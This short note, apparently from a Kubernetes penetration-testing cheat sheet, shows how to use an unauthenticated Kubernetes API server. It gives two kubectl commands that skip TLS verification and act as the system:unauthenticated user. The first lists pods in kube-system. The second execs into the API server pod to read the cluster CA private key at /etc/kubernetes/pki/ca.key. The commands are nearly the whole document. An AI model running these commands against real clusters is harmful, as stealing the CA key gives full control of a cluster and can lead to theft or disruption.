## Unauthenticated API Server


1. Easiest way to approach this is just kubectl. The only trick to it is that you need to give it a username of system:unauthenticated
 - kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://[IP]:6443 get po -n kube-system
 - kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://[IP]:6443 -n kube-system exec [APISERVERPOD] -- cat /etc/kubernetes/pki/ca.key